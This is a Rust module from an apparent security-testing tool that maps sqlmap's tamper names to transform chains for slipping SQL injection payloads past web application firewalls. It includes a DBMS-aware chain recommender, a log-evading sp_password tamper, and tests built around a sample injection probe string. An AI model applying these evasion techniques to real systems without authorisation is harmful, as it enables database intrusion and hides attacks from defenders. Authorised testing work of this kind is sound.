//! Named tampers: sqlmap's `--tamper` surface, expressed as transform chains.
//!
//! sqlmap ships 86 tamper *scripts*; many are variations on one idea (its
//! `space2*` family alone is seven files). This module names the ones whose
//! semantics our [`TransformKind`]s actually implement, so an operator can
//! write:
//!
//! ```text
//! --tamper space2comment,randomcase,versionedmorekeywords
//! ```
//!
//! and get a *reproducible, explainable* chain: the steps are recorded in the
//! payload's [`TransformationTrace`], so any finding can be replayed byte for
//! byte. A name we cannot honour is refused by name — we never silently
//! substitute a different transform for a tamper we do not implement.

use crate::payload::transform::{TransformKind, TransformationTrace};

/// Alias so the table below stays readable.
use TransformKind as K;

use crate::detection::DbmsFamily;

/// Which DBMS a tamper's rewrite is valid against.
///
/// sqlmap encodes this knowledge only as free-text `dependencies()` warnings a
/// human reads; we make it a value the engine can act on, so a chain built for
/// the wrong engine (Oracle's `1DUNION`, MySQL's `&&`) is filtered out instead
/// of silently producing a payload the target cannot parse.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DbmsTag {
    /// Standard SQL / applies to every engine.
    Any,
    /// MySQL and, by compatibility, MariaDB.
    MySql,
    /// Microsoft SQL Server.
    MsSql,
    /// PostgreSQL.
    PostgreSql,
    /// Oracle.
    Oracle,
    /// SQLite.
    SqLite,
}

impl DbmsTag {
    /// Whether a tamper carrying this tag is appropriate for `family`.
    ///
    /// `Any` fits every engine; MySQL and MariaDB are treated as one family,
    /// since MariaDB accepts the same evasion syntax.
    pub fn matches(self, family: DbmsFamily) -> bool {
        match self {
            DbmsTag::Any => true,
            DbmsTag::MySql => matches!(family, DbmsFamily::MySQL | DbmsFamily::MariaDB),
            DbmsTag::MsSql => matches!(family, DbmsFamily::MSSQL),
            DbmsTag::PostgreSql => matches!(family, DbmsFamily::PostgreSQL),
            DbmsTag::Oracle => matches!(family, DbmsFamily::Oracle),
            DbmsTag::SqLite => matches!(family, DbmsFamily::SQLite),
        }
    }
}

/// One named tamper.
#[derive(Debug, Clone, Copy)]
pub struct Tamper {
    /// The name sqlmap uses for the same idea (our own names are marked).
    pub name: &'static str,
    /// Transform steps, applied in order.
    pub steps: &'static [TransformKind],
    /// What it does, and what class of filter it defeats.
    pub note: &'static str,
}

/// Every named tamper we can honour.
pub const TAMPERS: &[Tamper] = &[
    // ── whitespace separators ────────────────────────────────────────────
    Tamper {
        name: "space2comment",
        steps: &[K::CommentSpace],
        note: "space -> /**/ — the classic separator substitution; defeats `keyword space keyword` signatures",
    },
    Tamper {
        name: "space2morecomment",
        steps: &[K::CommentSpaceVariant],
        note: "space -> /**_**/ — the variant that survives a naive /**/ stripper (sqlmap: space2morecomment)",
    },
    Tamper {
        name: "space2hash",
        steps: &[K::Space2HashNewline],
        note: "space -> #<newline>: MySQL closes the comment immediately, so the separator survives",
    },
    Tamper {
        name: "space2morehash",
        steps: &[K::Space2HashNewline],
        note: "as space2hash, applied to every whitespace run (sqlmap's space2morehash)",
    },
    Tamper {
        name: "space2plus",
        steps: &[K::PlusSpace],
        note: "space -> + — form-encoding separator for POST bodies",
    },
    Tamper {
        name: "space2randomblank",
        steps: &[K::Space2RandomBlank],
        note: "space -> cycling tab/newline/formfeed/CR/VT, so no single separator byte is fixed",
    },
    Tamper {
        name: "space2mssqlblank",
        steps: &[K::Space2MssqlBlank],
        note: "space -> the T-SQL blank set (%01-%0C, %0E): control characters MSSQL's lexer treats as space",
    },
    Tamper {
        name: "space2mssqlhash",
        steps: &[K::Space2HashNewline],
        note: "space -> #<newline> for MSSQL batch contexts (sqlmap's space2mssqlhash)",
    },
    Tamper {
        name: "space2mysqldash",
        steps: &[K::Space2DashNewline],
        note: "space -> --<newline>: a line comment that closes on the next byte, preserving the separator",
    },
    Tamper {
        name: "multiplespaces",
        steps: &[K::MultipleSpaces],
        note: "triple every space (sqlmap's multiplespaces)",
    },
    Tamper {
        name: "bluecoat",
        steps: &[K::TabSpace],
        note: "space -> tab, the separator Blue Coat proxies normalise but do not flag",
    },
    // ── case ─────────────────────────────────────────────────────────────
    Tamper {
        name: "randomcase",
        steps: &[K::KeywordCase],
        note: "alternate keyword case (SeLeCt) — deterministic, so results stay reproducible",
    },
    Tamper {
        name: "lowercase",
        steps: &[K::Lowercase],
        note: "force lower case, for filters that only match upper-case keywords",
    },
    Tamper {
        name: "uppercase",
        steps: &[K::Uppercase],
        note: "force upper case (ours; the mirror of lowercase)",
    },
    // ── comments, keyword wrapping, token splitting ──────────────────────
    Tamper {
        name: "versionedkeywords",
        steps: &[K::MysqlVersionedComment],
        note: "wrap keywords in /*!50000KEYWORD*/ — MySQL executes it, a generic comment stripper sees inert text",
    },
    Tamper {
        name: "versionedmorekeywords",
        steps: &[K::VersionedMoreKeywords],
        note: "as versionedkeywords, extended to function names and operators (sqlmap's versionedmorekeywords)",
    },
    Tamper {
        name: "halfversionedmorekeywords",
        steps: &[K::ModSecurityZeroVersioned],
        note: "wrap keywords in /*!0KEYWORD*/ — the zero-versioned form most signatures forgot to also match",
    },
    Tamper {
        name: "modsecurityversioned",
        steps: &[K::MysqlVersionedComment],
        note: "ModSecurity's own parser treats /*!50000*/ as a comment (sqlmap's modsecurityversioned)",
    },
    Tamper {
        name: "modsecurityzeroversioned",
        steps: &[K::ModSecurityZeroVersioned],
        note: "the /*!00000*/ variant (sqlmap's modsecurityzeroversioned)",
    },
    Tamper {
        name: "randomcomments",
        steps: &[K::RandomComments],
        note: "insert /**/ at every token boundary, so the payload has no two adjacent bare tokens",
    },
    Tamper {
        name: "commentbeforeparentheses",
        steps: &[K::CommentBeforeParentheses],
        note: "insert /**/ before every ( — defeats `fn(` signatures",
    },
    Tamper {
        name: "informationschemacomment",
        steps: &[K::InformationSchemaComment],
        note: "split information_schema./**/ so catalogue-name signatures miss it",
    },
    // ── encoding ─────────────────────────────────────────────────────────
    Tamper {
        name: "charencode",
        steps: &[K::CharEncode],
        note: "percent-encode every byte — for sinks that decode once before the query is built",
    },
    Tamper {
        name: "chardoubleencode",
        steps: &[K::DoubleUrlEncode],
        note: "encode twice, so one upstream decode reveals the once-encoded payload",
    },
    Tamper {
        name: "charunicodeencode",
        steps: &[K::CharUnicodeEncode],
        note: "%uXXXX IIS-style Unicode escape (sqlmap's charunicodeencode)",
    },
    Tamper {
        name: "charunicodeescape",
        steps: &[K::CharUnicodeEscape],
        note: "\\uXXXX escapes for JSON/JS sinks that unescape before querying",
    },
    Tamper {
        name: "urlencode",
        steps: &[K::UrlEncode],
        note: "percent-encode the unsafe subset only (ours; sqlmap applies this in the transport layer)",
    },
    Tamper {
        name: "base64encode",
        steps: &[K::Base64Encode],
        note: "base64 the whole payload, for parameters the application decodes first",
    },
    Tamper {
        name: "hexentities",
        steps: &[K::HexEntities],
        note: "&#xNN; entities, for sinks that HTML-decode before querying",
    },
    Tamper {
        name: "overlongutf8",
        steps: &[K::OverlongUtf8],
        note: "overlong UTF-8 for ' (%c0%a7) — some decoders normalise it into a quote",
    },
    Tamper {
        name: "percentage",
        steps: &[K::PercentagePrefix],
        note: "double only the percent signs, so one decode leaves a usable %XX for the next layer",
    },
    Tamper {
        name: "unmagicquotes",
        steps: &[K::UnmagicQuotes],
        note: "the GBK trick: %bf%27 (sqlmap's unmagicquotes)",
    },
    Tamper {
        name: "escapequotes",
        steps: &[K::EscapeQuotes],
        note: "escape ' as \\' so a filter that counts raw quotes miscounts",
    },
    // ── quotes, literals, NUL ────────────────────────────────────────────
    Tamper {
        name: "apostrophemask",
        steps: &[K::ApostropheMask],
        note: "' -> the fullwidth apostrophe %EF%BC%87, which a byte-level signature does not match",
    },
    Tamper {
        name: "apostrophenullencode",
        steps: &[K::ApostropheNullEncode],
        note: "prefix ' with a NUL byte (sqlmap's apostrophenullencode)",
    },
    Tamper {
        name: "appendnullbyte",
        steps: &[K::AppendNullByte],
        note: "append %00 so a string-based sanitiser truncates before our payload ends",
    },
    Tamper {
        name: "dollarquote",
        steps: &[K::DollarQuote],
        note: "PostgreSQL $$literal$$ — removes quote characters entirely (ours)",
    },
    // ── operators and expression forms ───────────────────────────────────
    Tamper {
        name: "equaltolike",
        steps: &[K::EqualsToLike],
        note: "= -> LIKE: leaves !=, <=, >= and == untouched",
    },
    Tamper {
        name: "between",
        steps: &[K::GreaterThanToNotBetween],
        note: "> -> NOT BETWEEN 0 AND (sqlmap's between); semantics-changing, so it is only trusted after a differential",
    },
    Tamper {
        name: "greatest",
        steps: &[K::GreatestObfuscation],
        note: "X>Y -> GREATEST(X,Y)=X: equivalent for numbers, and contains no > operator",
    },
    Tamper {
        name: "if2case",
        steps: &[K::IfToCase],
        note: "IF(a,b,c) -> CASE WHEN a THEN b ELSE c END (sqlmap's if2case)",
    },
    Tamper {
        name: "commalesslimit",
        steps: &[K::CommaLessLimit],
        note: "LIMIT m,n -> LIMIT n OFFSET m: no comma left to filter",
    },
    Tamper {
        name: "commalessmid",
        steps: &[K::CommaLessMid],
        note: "MID(a,b,c) -> MID(a FROM b FOR c) (sqlmap's commalessmid)",
    },
    Tamper {
        name: "concat2concatws",
        steps: &[K::ConcatToConcatWs],
        note: "CONCAT( -> CONCAT_WS(',', (sqlmap's concat2concatws)",
    },
    Tamper {
        name: "hex2char",
        steps: &[K::Hex2Char],
        note: "0xABCD -> CHAR(0xAB,0xCD), so the 0x prefix never appears in the shape a filter expects",
    },
    Tamper {
        name: "unionalltounion",
        steps: &[K::UnionAllToUnionDistinct],
        note: "UNION ALL -> UNION DISTINCT (sqlmap's unionalltounion)",
    },
    Tamper {
        name: "sp_password",
        steps: &[K::SpPasswordTail],
        note: "append -- sp_password so injected statements stay out of MSSQL server logs",
    },
    // ── expert additions (beyond sqlmap's coverage / our own) ────────────
    Tamper {
        name: "symboliclogical",
        steps: &[K::SymbolicLogical],
        note: "AND/OR -> &&/|| (MySQL/MariaDB): the keyword a signature matches is gone; boolean logic unchanged (sqlmap's symboliclogical)",
    },
    Tamper {
        name: "equaltorlike",
        steps: &[K::EqualsToRlike],
        note: "= -> RLIKE (regex match): only trusted after a differential, so it is flagged semantics-changing",
    },
    Tamper {
        name: "ifnull2ifisnull",
        steps: &[K::IfNullToIfIsNull],
        note: "IFNULL(a,b) -> IF(ISNULL(a),b,a): equivalent MySQL rewrite that dodges an IFNULL( signature (sqlmap's ifnull2ifisnull)",
    },
    Tamper {
        name: "ifnull2casewhenisnull",
        steps: &[K::IfNullToCaseWhenIsNull],
        note: "IFNULL(a,b) -> CASE WHEN ISNULL(a) THEN (b) ELSE (a) END (sqlmap's ifnull2casewhenisnull)",
    },
    Tamper {
        name: "sleep2getlock",
        steps: &[K::Sleep2GetLock],
        note: "SLEEP(n) -> GET_LOCK('bt_lock',n): an alternate MySQL time primitive for when SLEEP is filtered",
    },
    Tamper {
        name: "ord2ascii",
        steps: &[K::Ord2Ascii],
        note: "ORD( -> ASCII(: equivalent single-byte ordinal, word-boundary safe",
    },
    Tamper {
        name: "mid2leftright",
        steps: &[K::Mid2LeftRight],
        note: "MID(a,b,c) -> RIGHT(LEFT(a,(b)+(c)-1),c): equivalent substring for when MID/SUBSTRING is filtered",
    },
    Tamper {
        name: "decentities",
        steps: &[K::DecEntities],
        note: "every character as a decimal HTML entity &#N;, for sinks that HTML-decode before querying",
    },
    Tamper {
        name: "htmlencode",
        steps: &[K::HtmlEncode],
        note: "non-alphanumerics as decimal entities &#N; (sqlmap's htmlencode)",
    },
    Tamper {
        name: "space2mysqlblank",
        steps: &[K::Space2MysqlBlank],
        note: "space -> the MySQL blank set (tab/newline/VT/FF/CR): whitespace to MySQL's lexer, not the byte a signature expects (sqlmap's space2mysqlblank)",
    },
    Tamper {
        name: "overlongutf8more",
        steps: &[K::OverlongUtf8More],
        note: "overlong two-byte UTF-8 for every byte: valid to a lax decoder, unrecognisable to an ASCII signature (sqlmap's overlongutf8more)",
    },
    Tamper {
        name: "0eunion",
        steps: &[K::Union0e],
        note: "1 UNION -> 1e0UNION: scientific-notation zero exponent glues the number to UNION, removing the space (sqlmap's 0eunion)",
    },
    Tamper {
        name: "dunion",
        steps: &[K::DUnion],
        note: "1 UNION -> 1DUNION (Oracle): the D double-precision suffix glues the number to UNION (sqlmap's dunion)",
    },
    Tamper {
        name: "misunion",
        steps: &[K::MisUnion],
        note: "1 UNION -> 1-.1UNION: arithmetic glue; changes the operand value, so it is flagged semantics-changing (sqlmap's misunion)",
    },
    // ── composites (ours) ────────────────────────────────────────────────
    Tamper {
        name: "combo-comment-case",
        steps: &[K::CommentSpace, K::KeywordCase],
        note: "comment separators + mixed-case keywords in one pass (ours)",
    },
    Tamper {
        name: "combo-versioned-encoded",
        steps: &[K::VersionedMoreKeywords, K::KeywordCase, K::UrlEncode],
        note: "versioned keywords, re-cased, then percent-encoded (ours)",
    },
    Tamper {
        name: "combo-blank-encoded",
        steps: &[K::Space2RandomBlank, K::CharEncode],
        note: "blank-set separators plus full percent-encoding (ours)",
    },
]; // end TAMPERS

impl Tamper {
    /// The scheduling priority of this tamper, taken as the highest priority
    /// among its steps (the step that must see the rawest SQL decides when the
    /// whole tamper runs). Higher runs earlier. See
    /// [`TransformKind::priority`] for the tier rationale.
    ///
    /// Deriving this from the steps — rather than storing a separate number —
    /// keeps a single source of truth: a step cannot drift out of sync with a
    /// hand-written tamper priority, because there is only one to maintain.
    pub fn priority(&self) -> i8 {
        self.steps.iter().map(|s| s.priority()).max().unwrap_or(0)
    }

    /// Which DBMS this tamper's rewrite is valid against.
    pub fn dbms(&self) -> DbmsTag {
        dbms_for(self.name)
    }
}

/// The DBMS a tamper is specific to. Most tampers are standard SQL / transport
/// tricks (`Any`); only the ones whose rewrite depends on a particular engine's
/// syntax are tagged, so [`recommend_chain`] can drop the ones that would not
/// parse on the target.
fn dbms_for(name: &str) -> DbmsTag {
    match name {
        // MySQL/MariaDB-specific syntax.
        "versionedkeywords"
        | "versionedmorekeywords"
        | "halfversionedmorekeywords"
        | "modsecurityversioned"
        | "modsecurityzeroversioned"
        | "space2hash"
        | "space2morehash"
        | "space2mysqldash"
        | "space2mysqlblank"
        | "unmagicquotes"
        | "symboliclogical"
        | "sleep2getlock"
        | "ifnull2ifisnull"
        | "ifnull2casewhenisnull"
        | "concat2concatws"
        | "ord2ascii"
        | "mid2leftright"
        | "0eunion" => DbmsTag::MySql,
        // MSSQL-specific.
        "space2mssqlblank" | "space2mssqlhash" | "sp_password" => DbmsTag::MsSql,
        // PostgreSQL-specific.
        "dollarquote" => DbmsTag::PostgreSql,
        // Oracle-specific.
        "dunion" => DbmsTag::Oracle,
        // Everything else is standard SQL or a transport-layer trick.
        _ => DbmsTag::Any,
    }
}

/// A resolved chain of tampers, ready to apply.
#[derive(Debug, Clone)]
pub struct TamperChain {
    /// Names in application order.
    pub names: Vec<&'static str>,
    /// The flattened steps.
    pub steps: Vec<TransformKind>,
}

impl TamperChain {
    /// An empty chain — no transformation.
    pub fn identity() -> Self {
        Self {
            names: Vec::new(),
            steps: Vec::new(),
        }
    }

    pub fn is_identity(&self) -> bool {
        self.steps.is_empty()
    }

    /// Human summary, e.g. `space2comment+randomcase` or `identity`.
    pub fn summary(&self) -> String {
        if self.names.is_empty() {
            "identity".to_string()
        } else {
            self.names.join("+")
        }
    }

    /// Whether any step changes SQL semantics rather than representation.
    /// Such a chain's results must be confirmed by a differential.
    pub fn changes_semantics(&self) -> bool {
        self.steps.iter().any(|s| s.changes_semantics())
    }
}

/// Every tamper name, in table order.
pub fn names() -> Vec<&'static str> {
    TAMPERS.iter().map(|t| t.name).collect()
}

/// Look up a tamper by name, case-insensitively.
pub fn lookup(name: &str) -> Option<&'static Tamper> {
    let needle = name.trim();
    TAMPERS.iter().find(|t| t.name.eq_ignore_ascii_case(needle))
}

/// Parse a comma/space/semicolon-separated tamper list.
///
/// `none`, `identity` and an empty string all yield an empty chain. An unknown
/// name is an error that names the offender and suggests the closest known
/// tampers — a typo must never silently degrade into "no tampering", which
/// would quietly change what a scan actually tested.
///
/// The resolved tampers are then ordered by [`Tamper::priority`] (highest
/// first), *stably*, so equal-priority tampers keep the order the operator
/// wrote. This is the correctness win sqlmap leaves to the user: a structural
/// rewrite (`between`, a UNION mutation) runs before a whole-payload encoder
/// (`charencode`) no matter which order they were typed, so the encoder never
/// mangles the `>` or the space the rewrite still needs to find. `--tamper
/// charencode,between` and `--tamper between,charencode` now behave identically
/// and correctly.
pub fn resolve_chain(spec: &str) -> Result<TamperChain, String> {
    let mut resolved: Vec<&'static Tamper> = Vec::new();
    for raw in spec.split(|c: char| c == ',' || c == ';' || c.is_whitespace()) {
        let name = raw.trim();
        if name.is_empty() {
            continue;
        }
        let lower = name.to_ascii_lowercase();
        if lower == "none" || lower == "identity" {
            continue;
        }
        let Some(tamper) = lookup(&lower) else {
            let prefix: String = lower.chars().take(4).collect();
            let suggestions: Vec<&str> = TAMPERS
                .iter()
                .map(|t| t.name)
                .filter(|n| n.starts_with(&prefix))
                .take(6)
                .collect();
            return Err(if suggestions.is_empty() {
                format!(
                    "unknown tamper '{name}'; run `bugtools payload --list-tampers` to see all {}",
                    TAMPERS.len()
                )
            } else {
                format!("unknown tamper '{name}'; did you mean: {}", suggestions.join(", "))
            });
        };
        resolved.push(tamper);
    }
    // Stable sort by priority DESCENDING: higher-priority (more structural)
    // tampers apply first; ties preserve the user's written order.
    resolved.sort_by(|a, b| b.priority().cmp(&a.priority()));

    let mut chain = TamperChain::identity();
    for tamper in resolved {
        chain.names.push(tamper.name);
        chain.steps.extend_from_slice(tamper.steps);
    }
    Ok(chain)
}

/// Apply a chain, returning the transformed payload.
pub fn apply_chain(payload: &str, chain: &TamperChain) -> String {
    trace_chain(payload, chain).final_representation
}

/// Apply a chain, returning the full trace so a finding is replayable byte for
/// byte (the same guarantee the representation pipeline gives).
pub fn trace_chain(payload: &str, chain: &TamperChain) -> TransformationTrace {
    let mut trace = TransformationTrace::new(payload);
    for step in &chain.steps {
        trace = trace.apply(*step);
    }
    trace
}

/// Recommend an ordered, DBMS-appropriate tamper chain.
///
/// This is the capability sqlmap does not offer declaratively: instead of
/// making the operator hand-pick and hand-order scripts (and get the order
/// wrong), we assemble a chain that is (a) filtered to the target engine —
/// no MySQL `&&` sent at Oracle — and (b) priority-ordered so structural
/// rewrites precede encoders. When there is no WAF interference and no engine
/// hint, it returns the identity chain: we do not obfuscate a payload that has
/// no filter to evade, because needless tampering only muddies a finding.
pub fn recommend_chain(dbms: Option<DbmsFamily>, waf_present: bool) -> TamperChain {
    // Nothing to evade, nothing known: stay honest and send the clean payload.
    if !waf_present && dbms.is_none() {
        return TamperChain::identity();
    }

    let mut candidates: Vec<&'static str> = Vec::new();
    // Baseline representation evasion that is valid everywhere.
    candidates.push("randomcase");
    candidates.push("space2comment");

    if waf_present {
        // Broaden separators and split tokens harder under an active filter.
        candidates.push("randomcomments");
        candidates.push("charencode");
    }

    // Engine-specific rewrites; each is filtered below, so listing a MySQL
    // trick here is harmless when the target is Postgres.
    match dbms {
        Some(DbmsFamily::MySQL) | Some(DbmsFamily::MariaDB) => {
            candidates.push("versionedmorekeywords");
            candidates.push("space2mysqlblank");
            if waf_present {
                candidates.push("symboliclogical");
            }
        }
        Some(DbmsFamily::MSSQL) => {
            candidates.push("space2mssqlblank");
        }
        Some(DbmsFamily::PostgreSQL) => {
            candidates.push("dollarquote");
        }
        _ => {}
    }

    // Keep only tampers valid for the known engine, de-duplicate, then order.
    let mut resolved: Vec<&'static Tamper> = Vec::new();
    for name in candidates {
        let Some(tamper) = lookup(name) else { continue };
        if let Some(family) = dbms {
            if !tamper.dbms().matches(family) {
                continue;
            }
        }
        if resolved.iter().any(|t| t.name == tamper.name) {
            continue;
        }
        resolved.push(tamper);
    }
    resolved.sort_by(|a, b| b.priority().cmp(&a.priority()));

    let mut chain = TamperChain::identity();
    for tamper in resolved {
        chain.names.push(tamper.name);
        chain.steps.extend_from_slice(tamper.steps);
    }
    chain
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A probe string that contains something for every tamper to act on: a
    /// quote, a NUL escape, a numeric comparison, an operator, a function call,
    /// a CATALOG name, a hex literal, the keywords the case/keyword transforms
    /// need, plus IFNULL/ORD calls and a digit-preceded UNION for the expert
    /// rewrites.
    const SAMPLE: &str = "' AND IF(1=1,SLEEP(5),0) UNION ALL SELECT * FROM t WHERE 1=1 OR 1>0 \
        LIMIT 2,3 MID(a,1,2) IFNULL(x,y) ORD(z) 9 UNION SELECT CONCAT('a','b') 0x414243 %00 \
        information_schema.tables -- sp_password";

    fn chain_for(name: &str) -> TamperChain {
        resolve_chain(name).expect("tamper should resolve")
    }

    #[test]
    fn names_are_unique_and_non_empty() {
        let mut seen: Vec<&str> = Vec::new();
        for t in TAMPERS {
            assert!(!t.name.is_empty());
            assert!(!t.note.is_empty(), "{} has no explanation", t.name);
            assert!(!t.steps.is_empty(), "{} has no steps", t.name);
            assert!(!seen.contains(&t.name), "duplicate tamper name {}", t.name);
            seen.push(t.name);
        }
    }

    #[test]
    fn lookup_is_case_insensitive() {
        assert!(lookup("SPACE2COMMENT").is_some());
        assert!(lookup(" space2comment ").is_some());
        assert!(lookup("not-a-tamper").is_none());
    }

    #[test]
    fn chain_resolution_orders_by_priority() {
        // randomcase (KeywordCase, NORMAL=0) outranks space2comment
        // (CommentSpace, LOW=-10), so it applies first regardless of the order
        // the operator wrote.
        let chain = chain_for("space2comment, randomcase");
        assert_eq!(chain.names, vec!["randomcase", "space2comment"]);
        assert_eq!(chain.steps.len(), 2);
    }

    #[test]
    fn priority_ordering_fixes_the_encoder_before_rewrite_bug() {
        // The regression that motivates priority ordering: a whole-payload
        // encoder must never run before a structural rewrite, or it destroys
        // the operator (`>`) the rewrite needs. Both spellings must produce the
        // same, correct order — `between` (HIGHEST) before `charencode`
        // (LOWEST).
        let a = chain_for("charencode,between");
        let b = chain_for("between,charencode");
        assert_eq!(a.names, vec!["between", "charencode"]);
        assert_eq!(a.names, b.names);
        assert_eq!(a.steps, b.steps);
    }

    #[test]
    fn identity_chain_is_recognised() {
        for spec in ["", "none", "identity", " , "] {
            let chain = chain_for(spec);
            assert!(chain.is_identity(), "{spec:?} should be identity");
            assert_eq!(chain.summary(), "identity");
        }
    }

    #[test]
    fn unknown_tamper_is_refused_by_name() {
        // A typo must never silently degrade into "no tampering".
        let err = resolve_chain("space2coment").unwrap_err();
        assert!(err.contains("space2coment"), "error should name the offender: {err}");
        assert!(err.contains("space2comment"), "error should suggest: {err}");
    }

    #[test]
    fn every_named_tamper_actually_transforms() {
        // Guards against a table entry that maps to a no-op: each name must
        // change the sample, or it should not be offered.
        for t in TAMPERS {
            let out = apply_chain(SAMPLE, &chain_for(t.name));
            assert_ne!(out, SAMPLE, "tamper '{}' did not change the payload", t.name);
        }
    }

    #[test]
    fn a_tampered_payload_records_its_steps() {
        let chain = chain_for("space2comment,randomcase");
        let trace = trace_chain("' AND SELECT 1", &chain);
        assert_eq!(trace.steps.len(), chain.steps.len());
        // Priority ordering puts keyword_case (NORMAL) before comment_space (LOW).
        assert_eq!(trace.summary(), "keyword_case+comment_space");
        assert!(trace.final_representation.contains("/**/"));
    }

    #[test]
    fn semantics_changing_tampers_are_flagged() {
        assert!(chain_for("equaltolike").changes_semantics());
        assert!(chain_for("if2case").changes_semantics());
        // Pure representation tampers are not flagged.
        assert!(!chain_for("space2comment").changes_semantics());
        assert!(!chain_for("randomcase").changes_semantics());
    }

    #[test]
    fn sqlmap_named_tampers_are_covered() {
        // The names an operator arriving from sqlmap will try first.
        for name in [
            "space2comment",
            "space2hash",
            "space2plus",
            "space2randomblank",
            "randomcase",
            "versionedkeywords",
            "versionedmorekeywords",
            "modsecurityversioned",
            "charencode",
            "chardoubleencode",
            "charunicodeencode",
            "apostrophemask",
            "unmagicquotes",
            "base64encode",
            "equaltolike",
            "between",
            "greatest",
            "if2case",
            "commalesslimit",
            "concat2concatws",
            "hex2char",
            "unionalltounion",
            "sp_password",
            "informationschemacomment",
            "commentbeforeparentheses",
        ] {
            assert!(lookup(name).is_some(), "sqlmap tamper '{name}' is not covered");
        }
    }

    #[test]
    fn new_expert_tampers_are_covered() {
        for name in [
            "symboliclogical",
            "equaltorlike",
            "ifnull2ifisnull",
            "ifnull2casewhenisnull",
            "sleep2getlock",
            "ord2ascii",
            "mid2leftright",
            "decentities",
            "htmlencode",
            "space2mysqlblank",
            "overlongutf8more",
            "0eunion",
            "dunion",
            "misunion",
        ] {
            assert!(lookup(name).is_some(), "expert tamper '{name}' is not covered");
        }
    }

    #[test]
    fn semantics_changing_expert_tampers_are_flagged() {
        // A regex match and the parser-dependent UNION mutations must be
        // confirmed by a differential.
        assert!(chain_for("equaltorlike").changes_semantics());
        assert!(chain_for("symboliclogical").changes_semantics());
        assert!(chain_for("0eunion").changes_semantics());
        assert!(chain_for("misunion").changes_semantics());
        // Equivalent rewrites are pure representation.
        assert!(!chain_for("ifnull2ifisnull").changes_semantics());
        assert!(!chain_for("sleep2getlock").changes_semantics());
        assert!(!chain_for("ord2ascii").changes_semantics());
    }

    #[test]
    fn dbms_tags_gate_applicability() {
        assert_eq!(lookup("dunion").unwrap().dbms(), DbmsTag::Oracle);
        assert_eq!(lookup("dollarquote").unwrap().dbms(), DbmsTag::PostgreSql);
        assert_eq!(lookup("space2mssqlblank").unwrap().dbms(), DbmsTag::MsSql);
        assert_eq!(lookup("symboliclogical").unwrap().dbms(), DbmsTag::MySql);
        assert_eq!(lookup("space2comment").unwrap().dbms(), DbmsTag::Any);

        // MySQL family compatibility, and negative gating.
        assert!(DbmsTag::MySql.matches(DbmsFamily::MariaDB));
        assert!(!DbmsTag::Oracle.matches(DbmsFamily::MySQL));
        assert!(DbmsTag::Any.matches(DbmsFamily::PostgreSQL));
    }

    #[test]
    fn recommend_chain_is_engine_aware_and_ordered() {
        // No filter and no engine hint: stay honest, do not obfuscate.
        assert!(recommend_chain(None, false).is_identity());

        // MySQL under a WAF: only MySQL/Any tampers, priority-ordered, and no
        // Oracle/Postgres/MSSQL-specific step slips in.
        let chain = recommend_chain(Some(DbmsFamily::MySQL), true);
        assert!(!chain.is_identity());
        for name in &chain.names {
            let tag = lookup(name).unwrap().dbms();
            assert!(
                tag.matches(DbmsFamily::MySQL),
                "recommended '{name}' ({tag:?}) is not valid for MySQL"
            );
        }
        // Priorities are non-increasing across the recommended chain.
        let prios: Vec<i8> = chain.names.iter().map(|n| lookup(n).unwrap().priority()).collect();
        assert!(prios.windows(2).all(|w| w[0] >= w[1]), "chain not priority-ordered: {prios:?}");

        // A Postgres recommendation must not carry the MySQL-only blank set.
        let pg = recommend_chain(Some(DbmsFamily::PostgreSQL), true);
        assert!(!pg.names.contains(&"space2mysqlblank"));
    }
}



